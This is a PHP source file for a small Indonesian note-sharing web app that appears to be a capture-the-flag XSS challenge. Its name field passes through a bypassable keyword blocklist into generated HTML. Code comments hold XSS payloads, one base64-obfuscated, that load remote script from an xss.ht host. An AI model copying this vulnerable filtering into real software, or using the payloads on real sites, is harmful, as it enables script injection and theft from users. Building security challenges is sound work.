<?php
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
ini_set('session.cookie_httponly', 1);
session_start();
if (!isset($_SESSION['action'])) {
    $_SESSION['action'] = "0";
}

if(isset($_POST['name']) && isset($_POST['title']) && isset($_POST['note']) && isset($_SESSION['action'])){
  // !--><html onmouseover=eval(atob("JC5nZXRTY3JpcHQoIi8vcGxvYWR6enoueHNzLmh0Iik="))>
  $name = $_POST['name'];
  $title = htmlentities($_POST['title']);
  $note = htmlentities($_POST['note']);

  if($_SESSION['action'] > 15){
    die("Kamu melebihi limit!");
  }

  if(strlen($name) < 8 || strlen($title) < 10 || strlen($note) < 24){
    die("Inputan terlalu pendek");
  }

  if(strlen($name) > 250){
    die("Nama terlalu panjang.");
  }

  else if(strlen($title) > 32){
    die("Judul terlalu panjang.");
  }

  else if(strlen($note) > 3000){
    die("Tulisan terlalu panjang.");
  }

  $blocked_string = array('$', 'get', 'onerror', 'img', 'svg', 'onload', 'onclick', 'xss', "'", 'script', 'src', ';', 'code');

  // cleaning XSS
  for($i=0;$i<200;$i++){
    foreach($blocked_string as $str){
      $name = str_ireplace($str, '', $name);
    }
  }
  $filename = generateRandomString($length = 6);
  $file = fopen("notes/".$filename.".html", "w");
  $source = file_get_contents('notes.txt');
  $source = str_replace('{name}', $name, $source);
  $source = str_replace('{title}', $title, $source);
  $source = str_replace('{note}', $note, $source);
  fwrite($file, $source);
  fclose($file);
  $_SESSION['action'] += 1;
  header('Location: /notes/'.$filename.'.html');
  die();
}
// $.getScript("//pload.xss.ht")
?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Comot - online note service</title>
      <style>
    @import url(https://fonts.googleapis.com/css?family=Merriweather);form,h1{text-align:center}body,form input,form textarea,html{padding:1em;font-family:Merriweather,sans-serif}*,:after,:before{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box}body,html{background:#f1f1f1}h1{color:#a8a8a8;text-shadow:1px 1px 0 #fff}form{max-width:600px;margin:20px auto}form input,form textarea{border:0;outline:0;-moz-border-radius:8px;-webkit-border-radius:8px;border-radius:8px;display:block;width:100%;margin-top:1em;-moz-box-shadow:0 1px 1px rgba(0,0,0,.1);-webkit-box-shadow:0 1px 1px rgba(0,0,0,.1);box-shadow:0 1px 1px rgba(0,0,0,.1);resize:none}form input:focus,form textarea:focus{-moz-box-shadow:0 0 2px #e74c3c!important;-webkit-box-shadow:0 0 2px #e74c3c!important;box-shadow:0 0 2px #e74c3c!important}form #input-submit{color:#fff;background:#e74c3c;cursor:pointer}form #input-submit:hover{-moz-box-shadow:0 1px 1px 1px rgba(170,170,170,.6);-webkit-box-shadow:0 1px 1px 1px rgba(170,170,170,.6);box-shadow:0 1px 1px 1px rgba(170,170,170,.6)}form textarea{height:126px}.half{float:left;width:48%;margin-bottom:1em}.right{width:50%}.left{margin-right:2%}@media (max-width:480px){.half{width:100%;float:none;margin-bottom:0}}.cf:after,.cf:before{content:" ";display:table}.cf:after{clear:both}
    #report{
      position: fixed;
      top: 1em;
      right: 1em;
    }
    </style>


</head>

<body>
  <h1>Comot</h1>
<a id="report" href="/report/" onclick="javascript:event.target.port=30001">report abuse?</a>
<form class="cf" method="POST" action="">
  <div class="half left cf">
    <input name="name" type="text" id="input-name" placeholder="Nama">
    <input name="title" type="text" id="input-subject" placeholder="Judul">
  </div>
  <div class="half right cf">
    <textarea name="note" type="text" id="input-message" placeholder="Tulisan"></textarea>
  </div>
  <input type="submit" value="Submit" id="input-submit">
</form>


</body>
</html>
